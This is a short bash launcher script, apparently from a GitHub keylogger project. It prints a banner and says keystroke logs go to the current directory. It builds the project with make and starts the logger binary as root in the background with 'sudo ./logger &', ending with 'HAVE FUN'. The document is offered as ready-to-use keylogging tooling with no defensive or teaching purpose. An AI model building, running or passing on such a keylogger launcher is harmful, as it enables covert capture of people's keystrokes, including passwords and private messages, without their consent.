#!/bin/bash

RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
VIOLET=$(tput setaf 5)
NORMAL=$(tput sgr0)
BLUE=$(tput setaf 6)

echo "${VIOLET}  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
printf "\n  author: AMMICCO (https://github.com/ammicco1)\n\n"
echo "  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"

printf "${BLUE}\n    THE LOG FILE WILL BE CREATED IN THIS\n"
printf "    DIRECTORY, EDIT THE keylogger.c FILE TO\n" 
printf "    CHANGE THE PATH OF THE LOG FILE\n"

printf "\n\n\t${RED}!! REMEMBER TO KILL THE PROCESS !!\n\n\t\t${GREEN} !! HAVE FUN !!${NORMAL}\n\n"

make

sudo ./logger &
